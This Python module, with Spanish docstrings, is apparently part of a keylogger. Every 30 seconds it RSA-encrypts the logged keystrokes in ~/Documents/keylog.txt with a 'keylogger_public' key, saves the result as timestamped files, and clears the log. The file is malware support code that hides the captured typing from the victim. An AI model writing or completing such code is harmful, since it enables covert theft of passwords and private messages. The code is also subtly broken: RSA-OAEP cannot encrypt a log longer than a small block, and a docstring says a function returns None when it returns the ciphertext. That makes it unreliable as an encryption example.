from datetime import datetime
import os
import sys
import time
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

LOG_FILE = os.path.join(os.path.expanduser("~"), "Documents", "keylog.txt")
KEY_PATH = os.path.join(os.path.dirname(__file__), "keypair", "keylogger_public.pem")
ENCRYPTED_DIR = os.path.join(os.path.expanduser("~"), "Documents", "keylog_encrypted")

def encrypt_data(data, public_key):
    """Cifra los datos con la llave pública usando OAEP padding.
    ### Parameters
    1. data : bytes
        - Los datos a cifrar.
    2. public_key : cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey
        - Llave pública RSA para cifrado.
    ### Returns
    - None
        - No retorna ningún valor, pero escribe los datos cifrados en un archivo.
    """
    return public_key.encrypt(
        data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def load_public_key():
    """Carga la llave pública desde un archivo PEM.
    ### Returns
    - cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey
        - La llave pública RSA cargada desde el archivo.
    """
    with open(KEY_PATH, "rb") as key_file:
        return serialization.load_pem_public_key(key_file.read())

def process_encryption():
    """Procesa el cifrado del archivo de log si es necesario.
    ### Returns
    - None
        - No retorna ningún valor, pero cifra el contenido del archivo de log y lo guarda en un directorio específico.
    """
    public_key = load_public_key()
    os.makedirs(ENCRYPTED_DIR, exist_ok=True)
    
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "rb") as f:
            content = f.read()
        if content:
            encrypted = encrypt_data(content, public_key)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            out_path = os.path.join(ENCRYPTED_DIR, f"keylog_{timestamp}.bin")
            with open(out_path, "wb") as out_file:
                out_file.write(encrypted)
            with open(LOG_FILE, "w") as f:
                f.truncate(0)

# Initialize encryption tracking
last_encryption_time = time.time()

def check_and_encrypt():
    """Verifica si es tiempo de cifrar y procesa el cifrado si es necesario."""
    global last_encryption_time
    current_time = time.time()
    if current_time - last_encryption_time >= 30:  # 30 seconds
        process_encryption()
        last_encryption_time = current_time
